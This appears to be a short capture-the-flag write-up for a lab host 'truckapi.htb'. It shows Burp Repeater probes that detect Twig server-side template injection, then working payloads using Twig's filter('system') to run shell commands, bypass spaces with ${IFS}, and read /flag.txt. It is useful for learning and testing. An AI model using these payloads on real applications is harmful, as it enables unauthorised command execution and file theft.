Obtain the flag

Burp Suite - Repeater
```
api=http://truckapi.htb/?id=${7*7}
api=http://truckapi.htb/?id={{7*7}}
api=http://truckapi.htb/?id={{7*'7'}}
```
- It is running Twig - SSTI

```
http://truckapi.htb/?id={{['id']|filter('system')}}
http://truckapi.htb/?id={{['ls']|filter('system')}}
http://truckapi.htb/?id={{['ls${IFS}']|filter('system')}}
http://truckapi.htb/?id={{['ls${IFS}/']|filter('system')}}
http://truckapi.htb/?id={{['cat${IFS}/flag.txt']|filter('system')}}
```
